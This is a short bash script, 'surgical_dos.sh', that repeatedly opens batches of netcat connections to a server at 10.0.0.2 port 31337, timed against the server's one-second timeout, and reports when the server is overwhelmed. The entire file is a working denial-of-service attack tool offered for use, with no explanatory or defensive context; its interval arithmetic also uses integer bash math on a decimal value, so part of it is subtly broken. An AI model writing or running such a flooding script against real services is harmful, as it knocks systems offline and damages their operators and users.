#!/bin/bash
# surgical_dos.sh

SERVER_MAX=290     # From your successful test
ATTACKER_MAX=200   # Stay under your machine's limits
INTERVAL=0.9       # 90% of server's 1s timeout

cleanup() {
  pkill -f "nc 10.0.0.2 31337"
  exit
}
trap cleanup SIGINT

while true; do
  # Launch connections in batches to avoid self-DoS
  for batch in {1..5}; do
    for i in $(seq 1 $((ATTACKER_MAX/5))); do
      echo "B${batch}_$(date +%s.%N)" | nc -w 1 10.0.0.2 31337 &
      sleep 0.001
    done
    sleep $((INTERVAL/5))
  done

  # Health check
  if ! nc -z 10.0.0.2 31337 2>/dev/null; then
    echo "[!] Server overwhelmed - pausing"
    sleep 1
  fi
done
